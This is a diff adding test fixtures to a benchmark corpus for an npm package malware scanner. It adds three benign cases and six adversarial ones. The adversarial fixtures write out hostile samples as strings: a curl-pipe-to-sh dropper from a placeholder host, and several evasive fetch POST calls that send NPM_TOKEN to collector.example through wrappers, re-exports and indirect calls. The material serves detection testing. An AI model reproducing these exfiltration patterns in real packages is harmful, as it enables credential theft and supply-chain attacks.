@@ -231,6 +231,41 @@ export function buildBenchmarkCorpus(): CorpusCase[] {
         ]),
     },
     {
+      id: "benign-17-static-import-and-aliased-git",
+      category: "benign",
+      expected: ["VERIFIED_CLEAN_WITHIN_SCOPE"],
+      run: () =>
+        runInspectFixture("@cleanorg/git-meta-cli", [
+          { name: "package/package.json", content: JSON.stringify({ name: "@cleanorg/git-meta-cli", version: "1.0.0", license: "MIT", bin: { "git-meta": "./index.js" } }) },
+          { name: "package/fmt.js", content: "export const fmt = (s) => s.trim();" },
+          { name: "package/index.js", content: 'import { execSync as runGit } from "node:child_process"; const mod = await import("./fmt.js"); console.log(mod.fmt(runGit("git --version", { encoding: "utf8" })));' },
+        ]),
+    },
+    {
+      id: "benign-18-multihop-clean-fetch-helper",
+      category: "benign",
+      expected: ["VERIFIED_CLEAN_WITHIN_SCOPE"],
+      run: () =>
+        runInspectFixture("status-ping-cli", [
+          { name: "package/package.json", content: JSON.stringify({ name: "status-ping-cli", version: "1.1.0", license: "Apache-2.0" }) },
+          { name: "package/index.js", content: 'const doReq = (u) => fetch(u); const ping = (u) => doReq(u); export const check = () => ping("https://registry.npmjs.org/-/ping");' },
+        ]),
+    },
+    {
+      id: "benign-19-regex-var-and-array-literal",
+      category: "benign",
+      expected: ["VERIFIED_CLEAN_WITHIN_SCOPE"],
+      run: () =>
+        runInspectFixture("ast-keyword-lint", [
+          { name: "package/package.json", content: JSON.stringify({ name: "ast-keyword-lint", version: "1.0.0", license: "MIT" }) },
+          {
+            name: "package/index.js",
+            content:
+              'const reserved = ["eval"]; const re = /^prod/; const m = re.exec(process.env.MY_APP_MODE || ""); class Loader { import(x) { return x; } } console.log(reserved, m, new Loader().import(1));',
+          },
+        ]),
+    },
+    {
       id: "adv-01-postinstall-curl-pipe-sh",
       category: "adversarial",
       expected: ["MALICIOUS_INDICATORS_FOUND"],
@@ -484,6 +519,77 @@ export function buildBenchmarkCorpus(): CorpusCase[] {
         });
         return report.verdict;
       },
+    },
+    {
+      id: "adv-21-computed-dynamic-import-data-uri",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("data-import-loader", [
+          { name: "package/package.json", content: JSON.stringify({ name: "data-import-loader", version: "1.0.0", license: "MIT" }) },
+          { name: "package/index.js", content: 'await import("data:text/javascript,process.exit(0)");' },
+        ]),
+    },
+    {
+      id: "adv-22-aliased-esm-child-process-exec",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("aliased-cp-dropper", [
+          { name: "package/package.json", content: JSON.stringify({ name: "aliased-cp-dropper", version: "1.0.0", license: "MIT" }) },
+          { name: "package/index.js", content: 'import { execSync as run } from "node:child_process"; run("curl https://cdn.example/drop.sh | sh");' },
+        ]),
+    },
+    {
+      id: "adv-23-multihop-wrapper-and-indirect-eval",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("multihop-stealer", [
+          { name: "package/package.json", content: JSON.stringify({ name: "multihop-stealer", version: "1.0.0", license: "MIT" }) },
+          {
+            name: "package/index.js",
+            content:
+              'function outer(v) { return mid(v); } function mid(v) { const b = Buffer.from(v).toString("hex"); return inner(b); } const inner = (x) => fetch("https://collector.example/h", { method: "POST", body: x }); outer(process.env.NPM_TOKEN);',
+          },
+        ]),
+    },
+    {
+      id: "adv-24-cross-file-exported-sink-wrapper",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("split-sink-stealer", [
+          { name: "package/package.json", content: JSON.stringify({ name: "split-sink-stealer", version: "1.0.0", license: "MIT" }) },
+          { name: "package/transport.js", content: 'export function emitMetric(d) { return fetch("https://collector.example/m", { method: "POST", body: d }); }' },
+          { name: "package/cli.js", content: 'import { emitMetric } from "./transport.js"; emitMetric(globalThis.process.env.NPM_TOKEN);' },
+        ]),
+    },
+    {
+      id: "adv-25-no-semi-indirect-call-opt-chain",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("asi-optchain-stealer", [
+          { name: "package/package.json", content: JSON.stringify({ name: "asi-optchain-stealer", version: "1.0.0", license: "MIT" }) },
+          {
+            name: "package/index.js",
+            content:
+              'const tok = process?.env?.NPM_TOKEN\n(0, fetch)("https://collector.example/o", { method: "POST", body: tok })',
+          },
+        ]),
+    },
+    {
+      id: "adv-26-create-require-and-barrel-reexport",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("barrel-createreq-stealer", [
+          { name: "package/package.json", content: JSON.stringify({ name: "barrel-createreq-stealer", version: "1.0.0", license: "MIT" }) },
+          { name: "package/sink.js", content: 'export function dispatch(x) { return fetch("https://collector.example/b", { method: "POST", body: x }); }' },
+          { name: "package/barrel.js", content: 'export { dispatch } from "./sink.js";' },
+          { name: "package/index.js", content: 'import { dispatch } from "./barrel.js"; dispatch(process.env.NPM_TOKEN);' },
+        ]),
     },
   ];
 }
